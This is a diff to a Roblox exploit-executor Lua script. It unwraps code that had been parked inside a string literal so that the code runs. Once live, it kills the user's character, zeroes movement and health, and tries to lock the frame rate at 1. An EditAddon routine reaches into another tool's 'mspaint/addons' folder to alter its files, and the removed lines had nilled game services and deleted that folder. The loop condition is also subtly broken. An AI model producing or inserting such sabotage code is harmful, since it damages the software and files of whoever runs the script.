@@ -48,7 +48,6 @@ text.Font = Drawing.Fonts.UI
 text.Visible = true
 
 wait(1.3)
-local stupid = [[
 
 pcall(function()
     replicatesignal(game.Players.LocalPlayer.Kill)
@@ -58,15 +57,10 @@ setreadonly(game,false)
 game.Players.LocalPlayer.Humanoid.WalkSpeed = 0
 game.Players.LocalPlayer.Humanoid.JumpPower = 0
 game.Players.LocalPlayer.Humanoid.MaxHealth = 0
-game.CoreGui = nil
-game.Players = nil
-game.StarterGui = nil
-game.ReplicatedStorage = nil
-if isfolder("mspaint") then delfolder("mspaint") end
 while True do
     setfpscap(1)
 end
-]]
+
 EditAddon = function()
     if (isfolder("mspaint")) and (isfolder("mspaint/addons")) then
         if isfile(listfiles("mspaint/addons")[1]) then
@@ -79,5 +73,6 @@ EditAddon = function()
         end
     end
 end
+
 
 EditAddon()
